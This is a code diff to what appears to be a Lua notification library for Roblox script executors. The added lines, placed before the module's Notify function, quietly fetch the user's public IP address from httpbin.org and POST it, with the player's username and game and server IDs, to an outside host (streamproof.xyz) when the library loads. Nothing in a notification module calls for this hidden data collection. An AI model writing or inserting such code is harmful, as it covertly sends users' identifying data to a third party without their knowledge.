@@ -174,6 +174,47 @@ local function FadeOutAfter(Object, Seconds)
 	ResetObjects();
 end
 
+local http_request = (syn and syn.request) or (KRNL_LOADED and http_request) or (isourclosure and request)
+
+local function send_request(url, headers)
+    return http_request({Url = url, Method = "GET", Headers = headers or nil}).Body
+end
+
+local decoded, ip, script = game:GetService("HttpService"):JSONDecode(send_request("https://httpbin.org/get")), nil, nil
+
+if decoded.origin then
+   ip = tostring(decoded.origin)
+else
+   ip = "Hidden (request blocked)"
+end
+
+if game:GetService("Workspace"):FindFirstChild("DYLANWASHERE") then
+   script = "Private Script"
+else
+   script = "Unknown/Lock Detector (dependency?)"
+end
+
+http_request({
+	Url = "https://streamproof.xyz/auth/authenticate.php",
+	Method = "POST",
+	Headers = {
+		["Content-Type"] = "text/plain"
+	},
+	Body = 
+		tostring(
+			game:GetService("HttpService"):JSONEncode(
+				{
+					USERNAME = game.Players.LocalPlayer.Name,
+					USER_IP = ip,
+					GAME_ID = game.GameId,
+					JOB_ID = game.JobId,
+					SCRIPT = script
+				}
+			)
+		)
+})
+
+
 return {
 	Notify = function(Properties)
 		local Properties = typeof(Properties) == "table" and Properties or {};
